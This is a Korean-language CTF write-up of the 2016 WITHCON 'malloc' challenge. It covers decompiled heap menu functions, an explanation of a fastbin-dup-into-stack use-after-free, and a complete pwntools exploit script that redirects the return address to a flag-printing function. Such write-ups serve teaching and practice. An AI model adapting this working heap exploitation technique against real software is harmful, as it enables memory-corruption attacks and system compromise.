---
title: "2016 WITHCON malloc"
date: 2020-1-29
tags: [WITHCON]
categories: [WITHCON]
---

heap exploit문제다. 메인에서 스택주소라면서 main함수의 rbp-8 위치의 주소를 출력해줍니다.

메뉴는 총 5개로 malloc, free, list, modify, exit 이 있다. 청크는 최대 5개 까지 만들 수 있다.

```c++
__int64 __fastcall main(__int64 a1, char **a2, char **a3)
{
  __int64 result; // rax
  __int64 v4[5]; // [rsp+0h] [rbp-30h]
  __int64 i; // [rsp+28h] [rbp-8h]

  setvbuf(stdout, 0LL, 2, 0LL);
  signal(13, 1);
  for ( i = 0LL; i <= 4; ++i )
    v4[i] = 0LL;
  printf("Stack Address : %p\n", &i);
  while ( 1 )
  {
    menu();
    __isoc99_scanf("%ld", &i);
    result = i;
    switch ( i )
    {
      case 1LL:
        sub_4009E6(v4);                         // malloc
        break;
      case 2LL:
        sub_400BFD(v4);                         // free
        break;
      case 3LL:
        sub_400DFF(v4);                         // list
        break;
      case 4LL:
        sub_400CA1(v4);                         // modify
        break;
      case 5LL:
        return result;
      default:
        puts("There is no such choice.");
        break;
    }
  }
}
```

malloc해주는 함수인데 size와 data를 입력할 수 있는데 size가 32이상이면 그냥 malloc(32) 해준다. 

```c
int __fastcall sub_4009E6(__int64 a1)
{
  unsigned int v1; // ecx
  size_t v3; // rax
  __int16 buf; // [rsp+10h] [rbp-40h]
  __int16 v5; // [rsp+12h] [rbp-3Eh]
  int v6; // [rsp+14h] [rbp-3Ch]
  __int64 v7; // [rsp+18h] [rbp-38h]
  size_t size; // [rsp+38h] [rbp-18h]
  __int64 i; // [rsp+40h] [rbp-10h]
  void *v10; // [rsp+48h] [rbp-8h]

  size = 0LL;
  v10 = 0LL;
  i = 0LL;
  buf = 0;
  v5 = 0;
  v6 = 0;
  v1 = 0;
  do
  {
    *(&v7 + v1) = 0LL;
    v1 += 8;
  }
  while ( v1 < 24 );
  *(&v7 + v1) = 0;
  if ( *(a1 + 32) )
    return puts("There is no space to malloc.");
  printf("Enter size :");
  __isoc99_scanf("%ld", &size);
  fflush(stdin);
  if ( size <= 32 )
  {
    if ( size <= 0 || size > 32 )
    {
      puts("Size incorrect.");
      exit(-1);
    }
    v10 = malloc(size);
  }
  else
  {
    puts("It's too big!");
    v10 = malloc(32uLL);
  }
  for ( i = 0LL; i <= 4 && *(8 * i + a1) != v10; ++i )
  {
    if ( !*(8 * i + a1) )
    {
      *(a1 + 8 * i) = v10;
      break;
    }
  }
  printf("Enter data : ", &size);
  if ( read(0, &buf, 33uLL) == -1 )
  {
    puts("Read fail.");
    exit(-1);
  }
  v3 = strlen(&buf);
  memcpy(*(8 * i + a1), &buf, v3 - 1);
  fflush(stdin);
  return puts("Malloc complete.");
}
```

이 함수는 chunk를 free해준다.

```c
int __fastcall sub_400BFD(__int64 a1)
{
  __int64 v2; // [rsp+18h] [rbp-8h]

  printf("Which one do you want to free : ");
  __isoc99_scanf("%ld", &v2);
  _IO_getc(stdin);
  if ( v2 > 5 || v2 <= 0 || !*(8 * v2 - 8 + a1) )
    return puts("There is no chunk.");
  free(*(8 * v2 - 8 + a1));
  return puts("Chunk free complete.");
}
```

청크에 써있는 data들을 보여준다.

```c
int __fastcall sub_400DFF(__int64 a1)
{
  int result; // eax
  signed __int64 i; // [rsp+18h] [rbp-8h]

  for ( i = 0LL; i <= 4; ++i )
    result = printf("Chunk %ld : %s\n", i + 1, *(8 * i + a1));
  return result;
}
```

modify함수다. 청크의 값을 수정할 수 있다. 

```c
int __fastcall sub_400CA1(__int64 a1)
{
  unsigned int v1; // ecx
  size_t v3; // rax
  __int16 buf; // [rsp+10h] [rbp-30h]
  __int16 v5; // [rsp+12h] [rbp-2Eh]
  int v6; // [rsp+14h] [rbp-2Ch]
  __int64 v7; // [rsp+18h] [rbp-28h]
  __int64 v8; // [rsp+38h] [rbp-8h]

  v8 = 0LL;
  buf = 0;
  v5 = 0;
  v6 = 0;
  v1 = 0;
  do
  {
    *(&v7 + v1) = 0LL;
    v1 += 8;
  }
  while ( v1 < 24 );
  *(&v7 + v1) = 0;
  printf("Which chunk do you want to modify : ");
  __isoc99_scanf("%ld", &v8);
  _IO_getc(stdin);
  if ( v8 > 5 || v8 <= 0 || !*(8 * v8 - 8 + a1) )
    return puts("There is no chunk.");
  printf("Enter data : ", &v8);
  if ( read(0, &buf, 33uLL) == -1 )
  {
    puts("Read fail.");
    exit(-1);
  }
  v3 = strlen(&buf);
  memcpy(*(8 * v8 - 8 + a1), &buf, v3);
  fflush(stdin);
  return puts("Data modify complete.");
}
```

플래그를 출력해주는 함수도 있는데 여기로 리턴 뛰면 될거 같다.

```c
void __noreturn sub_400986()
{
  system("/bin/cat /home/easy_malloc/flag");
  exit(-1);
}
```

처음에 스택주소도 주겠다.. malloc 포인터를 스택영역으로 조작해서 풀면 될거다. how2heap에서 나오는 fastbin dup into stack을 이용하면 된다.

이게 Fake Chunk로 쓸만한 주소를 malloc함수에서 찾을 수 있는데 스택의 rbp를 아니까 변수의 위치도 다 알 수 있다. malloc함수에서 size를 입력받아서 입력받은 만큼 할당해주는데 이 size범위가 32가 넘으면 그냥 malloc(32)해준다. 근데 여기서 size 변수 값은 그대로니까 이걸 fake chunk로 이용할 수 있었다. 그리고 뒤에는 main으로 돌아가는 return address도 존재했다.

size위치는 rbp-0x18인데 rbp-0x20에 넣는 이유는 prev_size때문에 size 위치 맞추려고 그런거다. 이제 24바이트 이후에 리턴을 cat flag 해주는 주소로 넣으면 된다.

```
rbp-0x20 prev_size 
rbp-0x18 size
data(24)
rbp+8 ret
```

> exploit.py

```python
from pwn import *

context.log_level = 'debug'
e = ELF('./malloc')
p = process('./malloc')
shell = 0x400986 # system("/bin/cat /home/easy_malloc/flag");
sa = lambda x,y : p.sendafter(x,y)
sla = lambda x,y : p.sendlineafter(x,y)

def malloc(size,data):
	sla('>','1')
	sla(':',str(size))
	sa(':',data)

def free(idx):
	sla('>','2')
	sla(':',str(idx))

def list():
	sla('>','3')

def modify(idx,data):
	sla('>','4')
	sla(':',str(idx))
	sa(':',data)

p.recvuntil(': ')
stack = int(p.recvline().strip(),16) # main rbp-8
log.info('stack : {}'.format(hex(stack)))
main_rbp = stack + 8
log.info('main_rbp : {}'.format(hex(main_rbp))) # main rbp
malloc_rbp = main_rbp - 0x40
log.info('malloc_rbp : {}'.format(hex(malloc_rbp))) # malloc rbp

malloc(32,'A'*8)
free(1)
modify(1,p64(malloc_rbp-0x20)) # fake chunk -> size_t size
malloc(32,'B'*8) # fd = malloc_rbp-0x20
malloc(0x30,'C'*24+p64(shell)) # return shell
#malloc(0x30,'C'*0x18+p64(shell))

p.interactive()
```

